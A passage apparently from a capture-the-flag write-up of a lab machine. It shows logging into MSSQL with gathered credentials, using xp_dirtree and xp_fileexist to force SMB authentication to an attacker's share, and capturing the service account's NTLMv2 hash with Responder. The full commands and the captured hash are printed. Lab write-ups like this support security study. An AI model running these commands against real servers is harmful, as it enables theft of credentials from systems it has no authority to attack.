Connecting to the MSSQL service using mssqlclient.py with the creds gathered, we gain an SQL shell, from where we execute xp_dirtree or xp_fileexists commands to trigger an SMB connect to us (Kali machine) and in kali we fire up Responder to capture those hashes.

# mssqlclient.py reporting@10.10.10.125 -windows-auth

SQL> xp_dirtree "\\10.10.14.2\fakeshare"
SQL> xp_fileexist "\\10.10.14.2\fakeshare\file"

# Responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:c5bf2a33b0b3129a:44281EF51DA62A5FE407E504838466DE:0101000000000000C0653150DE09D201A514913404519750000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000004BDAD352A0486868484A280EFD7922545A9191DC5B094C10D5608C09D74188290A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000                                                                                                                                                                                                                   
[*] Skipping previously captured hash for QUERIER\mssql-svc


